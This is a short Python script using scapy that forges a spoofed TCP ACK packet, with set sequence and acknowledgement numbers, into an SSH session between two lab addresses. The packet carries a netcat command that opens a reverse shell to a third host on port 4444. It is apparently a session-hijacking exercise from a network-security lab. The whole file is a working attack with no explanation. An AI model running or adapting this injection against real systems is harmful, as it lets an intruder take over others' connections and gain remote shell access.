#!/user/bin/python
import sys
from scapy.all import *

IPLayer = IP (src="10.10.10.200", dst = "10.10.10.196")
TCPLayer = TCP (sport=42724, dport=22, flags="A", seq=282522456, ack=3527843461)

data = "\n nc -e /bin/sh 10.10.10.199 4444 \n"

pkt=IPLayer/TCPLayer/data
ls(pkt)
send(pkt,verbose=0)
